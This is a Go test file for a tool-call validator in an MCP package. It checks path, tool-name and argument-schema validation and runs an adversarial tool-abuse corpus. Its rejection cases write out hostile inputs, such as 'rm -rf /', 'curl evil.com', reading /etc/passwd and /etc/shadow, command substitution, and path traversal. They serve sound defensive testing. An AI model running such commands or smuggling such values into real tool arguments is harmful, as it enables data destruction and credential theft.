package mcp

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestValidatePathArg(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr string
	}{
		{"clean_relative_path", "src/main.go", ""},
		{"clean_nested_path", "src/pkg/handler.go", ""},
		{"single_dot_relative", "./src/main.go", ""},
		{"empty_path", "", "empty path"},
		{"semicolon_injection", "file.go; rm -rf /", "shell metacharacter"},
		{"pipe_injection", "file.go | cat /etc/passwd", "shell metacharacter"},
		{"ampersand_injection", "file.go && curl evil.com", "shell metacharacter"},
		{"backtick_injection", "file.go `whoami`", "shell metacharacter"},
		{"dollar_paren_injection", "file.go $(id)", "shell metacharacter"},
		{"newline_injection", "file.go\nrm -rf /", "shell metacharacter"},
		{"null_byte_injection", "file.go\x00/etc/passwd", "shell metacharacter"},
		{"or_pipe_injection", "file.go || curl evil.com", "shell metacharacter"},
		{"simple_traversal", "../../../etc/passwd", "path traversal"},
		{"traversal_in_middle", "src/../../../etc/shadow", "path traversal"},
		{"double_dot_only", "..", "path traversal"},
		{"absolute_path_unix", "/etc/passwd", "absolute path"},
		{"encoded_slash_no_traversal", "src%2Fmain.go", "URL-encoded"},
		{"encoded_dot_traversal", "%2e%2e/etc/passwd", "URL-encoded"},
		{"encoded_uppercase", "src%2Fetc%2Fpasswd", "URL-encoded"},
		{"windows_backslash", "src\\main.go", "backslash"},
		{"backslash_traversal", "..\\..\\etc\\passwd", "path traversal"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidatePathArg(tt.input)
			if tt.wantErr == "" {
				if err != nil {
					t.Errorf("ValidatePathArg(%q) = %v, want nil", tt.input, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidatePathArg(%q) = nil, want error containing %q", tt.input, tt.wantErr)
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("ValidatePathArg(%q) error = %q, want to contain %q", tt.input, err.Error(), tt.wantErr)
			}
		})
	}
}

func TestValidateToolName(t *testing.T) {
	allowed := map[string]bool{
		"read_file":   true,
		"list_dir":    true,
		"find_symbol": true,
	}

	tests := []struct {
		name    string
		tool    string
		wantErr string
	}{
		{"known_tool", "read_file", ""},
		{"another_known_tool", "find_symbol", ""},
		{"unknown_tool", "execute_command", "unknown tool"},
		{"empty_name", "", "empty tool name"},
		{"semicolon_in_name", "read_file; rm", "shell metacharacter"},
		{"backtick_in_name", "read_file`id`", "shell metacharacter"},
		{"pipe_in_name", "read_file|cat", "shell metacharacter"},
		{"newline_in_name", "read_file\nevil", "shell metacharacter"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateToolName(tt.tool, allowed)
			if tt.wantErr == "" {
				if err != nil {
					t.Errorf("ValidateToolName(%q) = %v, want nil", tt.tool, err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidateToolName(%q) = nil, want error containing %q", tt.tool, tt.wantErr)
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("ValidateToolName(%q) error = %q, want to contain %q", tt.tool, err.Error(), tt.wantErr)
			}
		})
	}
}

func TestValidateToolArgs(t *testing.T) {
	tests := []struct {
		name    string
		args    map[string]any
		schema  map[string]any
		wantErr string
	}{
		{
			name: "valid_args_match_schema",
			args: map[string]any{"path": "src/main.go"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"path": map[string]any{"type": "string"},
				},
				"required": []any{"path"},
			},
			wantErr: "",
		},
		{
			name: "missing_required_field",
			args: map[string]any{},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"path": map[string]any{"type": "string"},
				},
				"required": []any{"path"},
			},
			wantErr: "required field missing: path",
		},
		{
			name: "wrong_type_string_expected",
			args: map[string]any{"path": 42.0},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"path": map[string]any{"type": "string"},
				},
			},
			wantErr: "expected type string",
		},
		{
			name: "wrong_type_object_expected",
			args: map[string]any{"opts": "not-object"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"opts": map[string]any{"type": "object"},
				},
			},
			wantErr: "expected type object",
		},
		{
			name: "wrong_type_array_expected",
			args: map[string]any{"items": "not-array"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"items": map[string]any{"type": "array"},
				},
			},
			wantErr: "expected type array",
		},
		{
			name: "wrong_type_boolean_expected",
			args: map[string]any{"flag": "true"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"flag": map[string]any{"type": "boolean"},
				},
			},
			wantErr: "expected type boolean",
		},
		{
			name: "wrong_type_number_expected",
			args: map[string]any{"count": "five"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"count": map[string]any{"type": "number"},
				},
			},
			wantErr: "expected type number",
		},
		{
			name: "integer_rejects_float",
			args: map[string]any{"line": 3.14},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"line": map[string]any{"type": "integer"},
				},
			},
			wantErr: "expected integer, got float",
		},
		{
			name: "integer_accepts_whole_number",
			args: map[string]any{"line": 42.0},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"line": map[string]any{"type": "integer"},
				},
			},
			wantErr: "",
		},
		{
			name: "extra_fields_allowed",
			args: map[string]any{"path": "x", "extra": "y"},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"path": map[string]any{"type": "string"},
				},
			},
			wantErr: "",
		},
		{
			name:    "nil_args_no_required",
			args:    nil,
			schema:  map[string]any{"type": "object", "properties": map[string]any{}},
			wantErr: "",
		},
		{
			name:    "nil_args_with_required",
			args:    nil,
			schema:  map[string]any{"type": "object", "required": []any{"path"}},
			wantErr: "required field missing: path",
		},
		{
			name: "required_as_string_slice",
			args: map[string]any{},
			schema: map[string]any{
				"type": "object",
				"properties": map[string]any{
					"path": map[string]any{"type": "string"},
				},
				"required": []string{"path"},
			},
			wantErr: "required field missing: path",
		},
		{
			name:    "nil_schema_passes",
			args:    map[string]any{"anything": "goes"},
			schema:  nil,
			wantErr: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateToolArgs(tt.args, tt.schema)
			if tt.wantErr == "" {
				if err != nil {
					t.Errorf("ValidateToolArgs() = %v, want nil", err)
				}
				return
			}
			if err == nil {
				t.Fatalf("ValidateToolArgs() = nil, want error containing %q", tt.wantErr)
			}
			if !strings.Contains(err.Error(), tt.wantErr) {
				t.Errorf("ValidateToolArgs() error = %q, want to contain %q", err.Error(), tt.wantErr)
			}
		})
	}
}

type adversarialCase struct {
	Name     string `json:"name"`
	Category string `json:"category"`
	Input    string `json:"input"`
}

func TestAdversarial_ToolAbuse(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("..", "testdata", "adversarial", "tool_abuse.json"))
	if err != nil {
		t.Fatalf("failed to read tool_abuse.json: %v", err)
	}
	var cases []adversarialCase
	if err := json.Unmarshal(data, &cases); err != nil {
		t.Fatalf("failed to parse tool_abuse.json: %v", err)
	}
	if len(cases) == 0 {
		t.Fatal("adversarial corpus is empty")
	}

	hasShellChar := func(s string) bool {
		for _, mc := range shellMetachars {
			if strings.Contains(s, mc) {
				return true
			}
		}
		return false
	}

	for _, tc := range cases {
		t.Run(tc.Name, func(t *testing.T) {
			if !hasShellChar(tc.Input) {
				t.Skip("input has no shell metacharacters — not a path injection vector")
			}
			err := ValidatePathArg(tc.Input)
			if err == nil {
				t.Errorf("ValidatePathArg accepted adversarial input %q", tc.Input)
			}
		})
	}
}
